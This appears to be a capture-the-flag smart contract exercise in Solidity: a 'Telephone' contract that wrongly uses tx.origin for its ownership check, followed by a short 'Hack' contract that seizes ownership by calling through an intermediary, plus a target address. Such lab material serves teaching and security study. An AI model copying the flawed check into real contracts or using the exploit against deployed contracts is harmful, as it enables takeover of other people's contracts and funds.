// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

//Claim ownership of the contract below to complete this level.
//0x1F402d2b342a66BbC87DA7006998D5E0F78531C8

contract Telephone {

  address public owner;

  constructor() {
    owner = msg.sender;
  }

  function changeOwner(address _owner) public {
    if (tx.origin != msg.sender) {
      owner = _owner;
    }
  }
}

//solution

contract Hack {
    address public _target;

    constructor(address target) {
        _target = target;
    }

    function changeOwner(address owner) public {
        Telephone(_target).changeOwner(owner);
    }
}